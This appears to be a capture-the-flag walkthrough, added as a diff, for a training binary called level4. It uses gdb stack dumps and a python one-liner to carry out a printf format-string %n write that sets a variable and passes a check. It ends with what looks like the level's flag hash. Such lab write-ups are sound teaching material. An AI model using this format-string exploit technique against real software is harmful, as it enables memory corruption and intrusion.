@@ -1,0 +1,74 @@
+For this exercise we have the same problem as the previous one.
+We have a comparison to pass, with a variable, always 'm'.
+
+The challenge will be to pass it the right value to pass the comparison.
+The compare value is 0x1025544, which gives 16930116 in decimal.
+
+We still have a vulnerable printf, but this time in another function.
+We can imagine using the %n of printf to modify m.
+
+To start we will need the address of m:
+(gdb) p &m
+$2 = (<data variable, no debug info> *) 0x8049810
+
+We need to know what value printf will display to calculate the difference between
+the values of the stack and ours.
+
+(gdb) r
+Starting program: /home/user/level4/level4
+AAAA.%x.%x.%x.%x
+(gdb) c
+Continuing.
+AAAA.b7ff26b0.bffff734.b7fd0ff4.0
+
+Breakpoint 2, 0x0804848d in n ()
+(gdb) x/32x $esp
+0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
+0xbffff4f0:	0x41414141	0x2e78252e	0x252e7825	0x78252e78
+0xbffff500:	0xbfff000a	0xb7fde2d4	0xb7fde334	0x00000007
+0xbffff510:	0x00000000	0xb7fde000	0xb7fff53c	0xbffff558
+0xbffff520:	0x00000040	0x00000b80	0x00000000	0xb7fde714
+0xbffff530:	0x00000098	0x0000000b	0x00000000	0x00000000
+0xbffff540:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff550:	0x00000000	0xb7fe765d	0xb7e3ebaf	0x08048285
+(gdb) x/32x $esp-32
+0xbffff4c0:	0xbffff4f0	0xb7ff26b0	0xbffff734	0xb7fd0ff4
+0xbffff4d0:	0x00000000	0x00000000	0xbffff6f8	0x0804848d
+0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
+0xbffff4f0:	0x41414141	0x2e78252e	0x252e7825	0x78252e78
+0xbffff500:	0xbfff000a	0xb7fde2d4	0xb7fde334	0x00000007
+0xbffff510:	0x00000000	0xb7fde000	0xb7fff53c	0xbffff558
+0xbffff520:	0x00000040	0x00000b80	0x00000000	0xb7fde714
+0xbffff530:	0x00000098	0x0000000b	0x00000000	0x00000000
+ 
+We see that our AAAA are at line 0xbffff4f0 and that the string that returned us;
+b7ff26b0.bffff734.b7fd0ff4.0 is at line 0xbffff4c0 at the second column.
+There are 12 sections before our AAAA, so we will need 12 "%x" to get
+our strings. (or 11%x + 1%n)
+
+The first test to see if we can change the value of m:
+
+(gdb) r <<< $(python -c 'print "\x10\x98\x04\x08" + "%x " * 11 + "%n"')
+b7ff26b0 bffff734 b7fd0ff4 0 0 bffff6f8 804848d bffff4f0 200 b7fd1ac0 b7ff37d0
+
+Breakpoint 1, 0x08048492 in n ()
+(gdb) i r
+eax            0x53	83
+
+Yes it works! eax == 83!
+
+We can make  16930116 - 83 = 16930033.
+we are missing 16930033 char to pass the comparison.
+We can add a padding of 16930033 to test.
+
+With:
+python -c 'print "\x10\x98\x04\x08" + "%x " * 10 + "%16930033x" + "%n"'
+We have: 
+(gdb) i r
+eax            0x1025549	16930121
+
+We have 5 bytes too much,
+
+(python -c 'print "AAAA" + "\x10\x98\x04\x08" + "%x " * 11 + "%16930028x " + "%n"') | ./level4
+
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
